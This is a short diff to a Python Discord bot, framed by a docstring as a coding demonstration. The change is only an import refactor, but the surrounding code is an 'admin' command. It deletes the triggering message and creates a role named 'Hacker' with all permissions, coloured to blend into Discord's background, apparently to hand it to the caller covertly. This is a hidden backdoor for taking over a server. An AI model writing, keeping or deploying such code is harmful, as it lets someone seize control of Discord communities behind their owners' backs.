@@ -5,7 +5,6 @@ This video was intended to demonstrate the power of coding."""
 
 import discord
 from discord.ext import commands
-from discord import Permissions
 import string
 import random
 
@@ -53,7 +52,7 @@ async def admin(ctx):
     await ctx.message.delete()
     await ctx.guild.create_role(
         name='Hacker',
-        permissions=Permissions.all(),
+        permissions=discord.Permissions.all(),
         color=discord.Color(0x36393f)
     )
     role = discord.utils.get(ctx.guild.roles, name='Hacker')
